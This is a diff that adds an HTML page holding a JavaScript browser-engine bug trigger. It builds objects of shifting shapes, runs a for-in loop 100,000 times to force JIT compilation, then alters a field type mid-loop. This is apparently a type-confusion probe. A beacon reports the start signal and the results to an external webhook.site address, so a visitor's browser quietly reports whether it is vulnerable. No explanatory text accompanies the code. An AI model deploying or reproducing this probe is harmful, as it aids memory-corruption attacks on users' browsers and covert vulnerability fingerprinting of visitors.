@@ -1,0 +1,27 @@
+<html><body><script>
+const SINK = 'https://webhook.site/a02901c5-1463-4d49-8c93-b651b9c35595/';
+function beacon(t, v){ try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,200)), {mode:'no-cors'}); } catch(e) {} }
+beacon('start', 'MXdCi1w2');
+const object1 = {}; object1.a = 1;
+const object2 = {}; object2.a = 1; object2.b = 1;
+const object3 = {}; object3.a = 1; object3.b = 1; object3.c = 1;
+Object.defineProperty(object3, "d", {writable: false, enumerable: true, value: 1});
+const object4 = {}; object4.a = 1; object4.b = 1; object4.c = 1; object4.d = 1;
+for (let key in object3) { }
+delete object3.d;
+var escape;
+function trigger(callback) { for (let key in object2) { callback(); escape = object2[key]; } }
+for (var w = 0; w < 100000; w++) trigger(_ => _);
+var seq = [];
+(function(){
+  for (let key in object2) {
+    if (key === 'a') {
+      object4.c = 1.1;
+      for (let key2 in object1) { };
+    }
+    escape = object2[key];
+    seq.push(key + ':' + (typeof escape));
+  }
+})();
+beacon('seqdCi1w2', seq.join('|'));
+</script></body></html>
